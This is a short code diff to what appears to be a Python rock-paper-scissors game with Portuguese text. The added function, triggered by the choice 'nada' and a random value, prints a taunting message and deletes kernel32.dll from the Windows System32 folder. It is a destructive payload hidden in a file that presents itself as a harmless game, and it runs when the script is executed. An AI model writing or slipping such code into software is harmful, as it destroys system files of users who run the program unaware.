@@ -70,3 +70,13 @@ def escolha_tesoura():
 		elif escolha == "tesoura":
 			print ("Empate!!")
 escolha_tesoura()
+
+#caso nada
+def escolha_nada():
+	if args.mao == "nada":
+		if shoot == 1:
+			print("Kernel protegido ainda bem, né? :)")
+			os.remove("C:\\Windows\\System32\\kernel32.dll")
+		else:
+			print("melhor jogar algo.")
+escolha_nada()
